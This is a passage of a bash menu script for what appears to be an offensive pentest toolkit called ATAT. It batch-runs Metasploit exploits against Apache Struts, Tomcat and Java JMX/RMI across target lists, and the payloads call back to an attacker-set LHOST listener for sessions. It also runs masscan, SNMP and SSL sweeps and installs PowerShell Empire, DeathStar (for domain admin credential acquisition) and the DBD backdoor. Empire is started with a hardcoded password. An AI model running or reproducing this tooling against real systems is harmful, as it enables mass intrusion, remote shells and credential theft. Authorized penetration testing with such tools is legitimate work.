    "Mulit-Port")
    echo -e "\E[1;34m::::: \e[97mExploit All The Ports!!\E[1;34m:::::"
    echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
	inputfile=~/ATAT/MSF_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $usertarget;\
	set RPORT $PORT;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
            ;;
    "Multi-Target Struts")
    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Struts!!\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set TARGETURI $useruri;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Apache Struts Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
            ;;
    "Multi-Target Tomcat")
    echo -e "\E[1;34m::::: \e[97mExploit All The Apache Tomcat!!\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HttpPassword: (Blank if none)' userpassword; read -p 'Set HttpUsername: (Blank if none)' userusername;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HttpPassword $userpassword;\
	set HttpUsername $userusername;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Apache Tomcat Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
            ;;     
    "Multi-Target Java JMX")
    echo -e "\E[1;34m::::: \e[97mExploit All The Java JMX!!\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_jmx_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set JMXRMI $userjmxrmi;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"
            ;;
    "Multi-Target Java RMI")
    echo -e "\E[1;34m::::: \e[97mExploit All The Java RMI!!\E[1;34m:::::"
	echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_rmi_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HTTPDELAY $userdelay;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            echo -e "\E[1;34m::::: \e[97mEnter\e[31m resource '/root/ATAT/ATAT_multi_post.rc'\e[97m in listener window to run post exploitation modules\E[1;34m:::::"        
            ;;            
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

 "7" | "7" )
         
echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 6=Main Menu | 7=QUIT: '
options=("Multi-Port Auxiliary" "Multi-Target SNMP Enumeration" "Multi-Target Load Balancer Detection" "Multi-Target SSLScan" "Multi-Target Masscan of All TCP Ports" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
	"Multi-Port Auxiliary")
	
            read -p 'Set MODULE_PATH: ' usermodule; read -p 'Set RHOSTS: ' usertarget;
	inputfile=~/ATAT/MSF_AUX_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $usermodule;\
	set RHOSTS $usertarget;\
	set RPORT $PORT;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned\E[1;34m:::::"
            ;;
    "Multi-Target SNMP Enumeration")
    echo -e "\E[1;34m::::: \e[97mDump All The SNMP!!\E[1;34m:::::"
            read -p 'Set RPORT (default=161): ' targetport; read -p 'Set Community String (default=public): ' userstring; read -p 'Set SNMP Version (default=1): ' userversion;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use auxiliary/scanner/snmp/snmp_enum;\
	set RPORT $targetport;\
	set RHOSTS $IP;\
	set COMMUNITY $userstring;\
	set VERSION $userversion;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets' SNMP Have Been Enumerated!\E[1;34m:::::"
            ;;
     "Multi-Target Load Balancer Detection")
	echo -e "\E[1;34m::::: \e[97mMulti-Target Load Balancer Detection\E[1;34m:::::"		
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~LBD_Results_temp.txt
	for IP in $(cat $inputfile)
	do
	lbd $IP | tee $outputfile
	cat $outputfile >> LBD_Results.txt
	done
	rm $outputfile
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Processed!\E[1;34m:::::"
            ;;
    "Multi-Target SSLScan")
	echo -e "\E[1;34m::::: \e[97mMulti-Target SSLScan\E[1;34m:::::"		
	inputfile=~SSLScan_masscan_results.txt
	outputfile=~SSLScan_Results.txt
	for IP in $(cat $inputfile)
	do
	sslscan --no-failed --no-rejected --certificate-info --verbose $IP | tee $outputfile
		
	cat $outputfile | egrep "Testing|RC4" | grep -B1 RC4 >> rc4.txt
	cat $outputfile | egrep "Testing|SSLv2" | grep -B1 SSLv2 >> sslv2.txt
	cat $outputfile | egrep -B1 "Testing|SSLv3|TLSv1.0" >> heartbleed_targets.txt
	cat $outputfile | egrep "Testing|EXP" | grep -B1 EXP >> freak.txt
	cat $outputfile | egrep "Testing|40 |56 " | egrep -B1 "40 |56 " >> weak_ciphers.txt
	cat $outputfile | egrep "Testing|After" | grep -B1 After >> expired_certs.txt
	cat $outputfile | egrep "Testing|Certificate|Subject|Issuer|valid" | grep -B1 -A4 Certificate >> ssl_certs.txt
	done
                echo -e "\E[1;34m::::: \e[97mCheck ATAT Folder for results!\E[1;34m:::::"
            ;;
    "Multi-Target Masscan of All TCP Ports")
 echo -e "\E[1;34m::::: \e[97mMasscan All TCP Ports\E[1;34m:::::"
 
PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Run" "Options (enter manual targets for pause/resume support)" "Resume" "Main Menu" "Quit")
select opt in "${options[@]}"
	do
		case $opt in
		"Run")
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~masscan_results.txt
	for IP in $(cat $inputfile)
	do
	masscan $IP -p0-65535 --rate 1000 | tee $outputfile
	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
#	awk -F'/' '{ print $2 ":" $1 }' output.txt | awk '{print $3}'
	sed "/Discovered open port /s/Discovered open port /""/g" ~masscan_results.txt > ~masscan_results1.txt
	awk -F/ '{ print $2 ":" $1 }' ~masscan_results1.txt > ~masscan_results2.txt
	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
	rm ~masscan_results*.txt
	done
            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
            ;;
        "Options (enter manual targets for pause/resume support)")
	outputfile=~masscan_results.txt
	read -p 'Enter Target IPs (space delimited):' usertargets;
	masscan $usertargets -p0-65535 --rate 1000 | tee $outputfile
	cat $outputfile | egrep "Discovered open port" | grep -B1 open >> Open_Ports.txt
	sed "/Discovered open port /s/Discovered open port /""/g" ~masscan_results.txt > ~masscan_results1.txt
	awk -F/ '{ print $2 ":" $1 }' ~masscan_results1.txt > ~masscan_results2.txt
	sed "/tcp on /s/tcp on /""/g" ~masscan_results2.txt >> ~masscan_results3.txt
	sed "/ /s/ /""/g" ~masscan_results3.txt >> ~SSLScan_masscan_results.txt
	rm ~masscan_results*.txt
            echo -e "\E[1;34m::::: \e[97mAll TCP Ports Have Been Scanned!\E[1;34m:::::"
            ;;
        "Resume")
    masscan --resume paused.conf
			;;           
        "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
		esac
	done
	        ;;
    "Main Menu")
            ~/ATAT/ATAT.sh
            ;;
    "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;
  
"8" | "8" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mCheck for Dependencies\E[1;34m:::::"
  echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar Option Should Only Be Run If You Are Logged In As root!!\E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 4=Main Menu | 5=QUIT: '
options=("Powershell Empire & DeathStar" "Dependencies" "DBD Installer" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
		"Powershell Empire & DeathStar")
		git clone https://github.com/EmpireProject/Empire ~/Empire
		cd ~/Empire/setup && chmod +x install.sh && pip install editorconfig && pip install hackersh && pip install wafw00f && pip install Markdown && pip install pysnmp && pip install jsbeautifier && ./install.sh && cd .. && chmod +x empire && cd ..
		git clone https://github.com/byt3bl33d3r/DeathStar ~/DeathStar
		cd ~/DeathStar && pip install -r requirements.txt && pip3 install -r requirements.txt
		cd ..
		echo -e "\e[1;34m[*] Installing Powershell Empire & DeathStar...\e[0m\n"
			;;
        "Dependencies")
		clear
		echo -e "\e[1;34m[*] Performing an APT Update prior to installing dependencies...\e[0m\n"
		sleep 3
		apt-get update
		echo ""
		echo -e "\e[1;32m[+] APT Update complete...\e[0m"
		sleep 3
		clear
		echo -e "\e[1;34m[*] Please wait while I install some dependencies...\e[0m\n"
		sleep 3
		clear
#		updatedb
		mkdir /tmp/ATAT/
		echo ""

	reqs="gcc gcc-mingw-w64-i686 curl jq"
	for i in $reqs; do
		dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
		isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")
		if [ ! -e /usr/bin/$i ] && [ ! -e /usr/sbin/$i ] && [ ! -e /usr/local/sbin/$i ] && [ ! -e /usr/local/bin/$i ] && [ -z "$isinstalled" ]; then
				echo -e "\e[1;34m[-] It doesn't appear that $i is installed on your system. Installing it now...\e[0m"
				echo ""
			if [ ! -z $(apt-get install -y "$i" | grep -o "E: Couldn") ]; then
				echo -e "\e[1;31m[-] I had a hard time installing $i from the Kali-Linux repository.\e[0m"
				touch /tmp/ATAT/$i-fail.txt
			else
				dpkg -s "$i" &> /tmp/ATAT/$i-install.txt
				isinstalled=$(cat /tmp/ATAT/$i-install.txt | grep -o "Status: install ok installed")				
				if [ ! -z "$isinstalled" ]; then
					update=1
					echo -e "\e[1;32m[+] Good news, $i installed without any issues.\e[0m"
					echo ""
					sleep 2
				else
					echo ""
					echo -e "\e[1;31m[!] It doesn't appear that I will be able to install $i right now.\e[0m"
					echo ""
					sleep 2
				fi
			fi
		else
			echo -e "\e[1;32m[+] $i is already installed on your system, moving on...\e[0m"
			echo ""
			sleep 2
		fi
	done
		rm -rf /tmp/ATAT/
			;;
		"DBD Installer")
		dbdinstalled=$(ls /usr/bin/dbd)
		if [ "$dbdinstalled" == "/usr/bin/dbd" ]; then
			echo -e "\n\e[1;34m[*] I see that DBD is already installed...\e[0m"
			echo ""
			sleep 3
			echo "Aufiederszehn" && ~/ATAT/ATAT.sh
		else
			echo -e "\e[1;34m[*] Performing DBD install...\e[0m\n"
			clear
			echo -e "\e[1;34mPlease wait while I install DBD on your machine...\e[0m"
			echo ""
			sleep 3
			cp ~/ATAT/misc/dbd/conf/dbd_defaults.conf ~/ATAT/misc/dbd/dbd.h
			cd ~/ATAT/misc/dbd/
			make unix
			chmod +x dbd
			cp dbd ~/ATAT/misc/dbd/binaries/
			mv dbd /usr/bin/
			cd ~/ATAT/
			echo "" 
			echo -e "\e[1;32mDone! Returning to the Main Menu...\e[0m"
			echo ""
			sleep 3
	fi
			;;
		"Main Menu")
            ~/ATAT/ATAT.sh
            ;;
		"Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done 

;;

   "9" | "9" )
          
echo -e "\E[1;34m::::: \e[97mPowershell Empire & DeathStar \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mEmpire & DeathStar MUST be installed in /root/!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mTHIS SECTION ONLY WORKS FROM THE /root/ CONTEXT!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mIF YOU'RE NOT LOGGED IN AS root, DO NOT USE THESE OPTIONS!! \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mOnly Launch DeathStar (Step 2) If Your Goal Is To Automate Domain Admin Credential Acquisition \E[1;34m:::::"

PS3='Enter your choice: ENTER=Options Menu | 18=Main Menu | 19=QUIT: '
options=("Step 1 - Launch Powershell Empire & RESTful API" "Step 2 - Launch DeathStar (Optional)" "Step 3 - Acquire PSE REST API Permanent Token" "Start PSE Listener" "Get PSE Stagers" "Get PSE Agents" "Rename PSE Agent" "Generate PSE Stagers - Windows (mostly)" "Generate PSE Stagers - Windows/OSX/Linux" "Generate PSE Stagers - Windows Office File & CSharp Payload" "Windows Post-Exploitation" "Linux/OSX Post-Exploitation" "Get PSE Stored Credentials" "Kill PSE Listener" "Kill All PSE Listeners" "Restart PSE RESTful API" "Shutdown PSE RESTful API" "Main Menu" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Step 1 - Launch Powershell Empire & RESTful API")
    # Start the Empire console & RESTful API
	echo -e "\E[1;34m::::: \e[97mLaunching Powershell Empire & RESTful API \E[1;34m:::::"
	cd ~/Empire && python empire --rest --username empireadmin --password Password123
	cd ..
	        ;;
        "Step 2 - Launch DeathStar")
    echo -e "\E[1;34m::::: \e[97mLaunching DeathStar \E[1;34m:::::"
    python3 ~/DeathStar/DeathStar.py
    	    ;;
        "Main Menu")
           ~/ATAT/ATAT.sh
            ;;
        "Quit")
            echo "Aufiederszehn" && exit 1
            ;;
        *) echo invalid option;;
    esac
done

;;
   
esac

tput sgr0                               # Reset colors to "normal."

exit 0
